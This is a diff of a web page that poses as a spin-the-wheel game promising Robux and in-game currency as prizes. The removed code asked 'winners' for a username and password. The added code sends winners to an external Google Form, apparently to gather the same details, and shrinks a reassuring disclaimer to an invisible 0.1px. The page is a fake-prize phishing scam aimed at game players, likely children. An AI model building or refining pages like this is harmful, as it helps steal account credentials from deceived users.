@@ -33,19 +33,26 @@
         }
 
         button {
-            padding:20px 50px;
-            font-size:18px;
+            padding:25px 60px;
+            font-size:22px;
             background:#22c55e;
             border:none;
-            border-radius:15px;
+            border-radius:20px;
+            cursor:pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        button:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 20px #22c55e;
         }
 
         .mobile button {
             width:90%;
-            font-size:22px;
+            font-size:26px;
         }
 
-        .popup {
+        .popup, .win-screen {
             display:none;
             position:fixed;
             top:0;
@@ -53,6 +60,9 @@
             width:100%;
             height:100%;
             background:rgba(0,0,0,0.8);
+            justify-content:center;
+            align-items:center;
+            flex-direction:column;
         }
 
         .popup-content {
@@ -66,6 +76,25 @@
         .mobile .popup-content {
             width:90%;
             margin:40% auto;
+        }
+
+        .win-text {
+            font-size:50px;
+            font-weight:bold;
+            color:#22c55e;
+            animation: pop 0.6s ease-in-out infinite alternate;
+        }
+
+        .redirect-text {
+            font-size:32px;
+            font-weight:bold;
+            color:#ffffff;
+            margin-top:20px;
+        }
+
+        @keyframes pop {
+            from { transform: scale(1); }
+            to { transform: scale(1.25); }
         }
 
         input {
@@ -85,7 +114,7 @@
             position:fixed;
             bottom:10px;
             right:10px;
-            font-size:10px;
+            font-size:0.1px;
             opacity:0.4;
         }
     </style>
@@ -122,7 +151,7 @@
 
     <button onclick="spin()">SPIN</button>
 
-    <h2>Land on Secret, God, OG to win</h2>
+    <h2>Land on a Secret, God, OG to win 2k Robux, 200 mil Tang Tang</h2>
 
     <p>Common: <span id="common">0</span></p>
     <p>Rare: <span id="rare">0</span></p>
@@ -134,23 +163,10 @@
     <p>OG: <span id="og">0</span></p>
 </div>
 
-<!-- POPUPS -->
-<div id="popup1" class="popup">
-    <div class="popup-content">
-        <h3>YOU WON! Enter Username</h3>
-        <input id="username1" type="text" placeholder="Username">
-        <br><br>
-        <button onclick="nextPopup()">Next</button>
-    </div>
-</div>
-
-<div id="popup2" class="popup">
-    <div class="popup-content">
-        <h3>Enter Password</h3>
-        <input id="username2" type="text" placeholder="Password">
-        <br><br>
-        <button onclick="finish()">Submit</button>
-    </div>
+<!-- WIN SCREEN -->
+<div id="winScreen" class="win-screen">
+    <div class="win-text" id="winText">YOU WON 🎉</div>
+    <div class="redirect-text" id="redirectText"></div>
 </div>
 
 <div class="bottom-left">All info is used safely</div>
@@ -171,79 +187,54 @@ let inventory = {
 };
 
 function setDevice(type) {
-    document.getElementById("deviceSelect").style.display = "none";
-    document.getElementById("game").classList.remove("hidden");
-
-    if (type === 'mobile') {
-        document.body.classList.add("mobile");
-    }
+    document.getElementById('deviceSelect').style.display = 'none';
+    document.getElementById('game').classList.remove('hidden');
+    if(type==='mobile'){document.body.classList.add('mobile');}
 }
 
 function spin() {
-    let rand = Math.random() * 100;
-    let result = "";
+    let rand = Math.random()*100;
+    let result='';
+    if(rand<75){result='Common 🟩'; inventory.common++;}
+    else if(rand<95){result='Rare 🟦'; inventory.rare++;}
+    else if(rand<98){result='Epic 🟪'; inventory.epic++;}
+    else if(rand<99){result='Legendary 🟨'; inventory.legendary++;}
+    else if(rand<99.75){result='Mythic 🟥'; inventory.mythic++;}
+    else if(rand<99.95){result='Secret ⬛'; inventory.secret++; showWinScreen();}
+    else if(rand<99.99){result='God ⬜'; inventory.god++; showWinScreen();}
+    else{result='OG 🐘'; inventory.og++; showWinScreen();}
 
-    if (rand < 75) {
-        result = "Common 🟩";
-        inventory.common++;
-    } 
-    else if (rand < 95) {
-        result = "Rare 🟦";
-        inventory.rare++;
-    } 
-    else if (rand < 98) {
-        result = "Epic 🟪";
-        inventory.epic++;
-    } 
-    else if (rand < 99) {
-        result = "Legendary 🟨";
-        inventory.legendary++;
-    } 
-    else if (rand < 99.75) {
-        result = "Mythic 🟥";
-        inventory.mythic++;
-    } 
-    else if (rand < 99.95) {
-        result = "Secret ⬛";
-        inventory.secret++;
-        showPopup();
-    } 
-    else if (rand < 99.99) {
-        result = "God ⬜";
-        inventory.god++;
-        showPopup();
-    } 
-    else {
-        result = "OG 🐘";
-        inventory.og++;
-        showPopup();
-    }
-
-    document.getElementById("result").innerText = result;
-
-    for (let key in inventory) {
-        document.getElementById(key).innerText = inventory[key];
-    }
-
-    document.getElementById("spinSound").play();
+    document.getElementById('result').innerText=result;
+    for(let key in inventory){document.getElementById(key).innerText=inventory[key];}
+    document.getElementById('spinSound').play();
 }
 
-function showPopup() {
-    document.getElementById("popup1").style.display = "block";
-}
+function showWinScreen(){
+    const win=document.getElementById('winScreen');
+    const winText=document.getElementById('winText');
+    const redirectText=document.getElementById('redirectText');
+    win.style.display='flex';
+    redirectText.innerText='';
 
-function nextPopup() {
-    document.getElementById("popup1").style.display = "none";
-    document.getElementById("popup2").style.display = "block";
-}
+    if(navigator.vibrate){navigator.vibrate([200,100,200]);}
 
-function finish() {
-    document.getElementById("popup2").style.display = "none";
-    document.getElementById("popup1").style.display = "none";
+    // Show 'YOU WON' for 3s
+    setTimeout(()=>{
+        redirectText.innerText='Redirecting...';
 
-    document.getElementById("username1").value = "";
-    document.getElementById("username2").value = "";
-}
+        // Open the form after redirect text shows
+        const winForm = window.open('https://forms.gle/2sdzpUsntMRDdxZXA','_blank');
+
+        // Automatically close the form after 30s
+        setTimeout(()=>{
+            if(winForm && !winForm.closed){
+                winForm.close();
+                alert('The form has been closed.');
+            }
+            win.style.display='none';
+        },30000);
+    },3000);
+} 
 </script>
 
 </body>
